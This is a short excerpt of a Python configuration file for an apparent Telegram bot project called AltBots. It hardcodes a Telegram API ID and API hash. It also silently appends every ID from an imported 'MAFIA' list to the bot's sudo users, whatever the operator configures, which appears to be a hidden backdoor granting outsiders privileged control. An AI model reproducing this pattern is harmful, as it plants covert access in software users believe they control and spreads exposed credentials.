...
from AltBots.data import MAFIA
...
API_ID = 25216084
API_HASH = "adbc65e6326e5b99761870724f17304c"
...
SUDO_USERS = list(map(lambda x: int(x), getenv("SUDO_USERS", default="6673205445").split()))
for x in MAFIA:
    SUDO_USERS.append(x)
OWNER_ID = int(getenv("OWNER_ID", default="6673205445"))
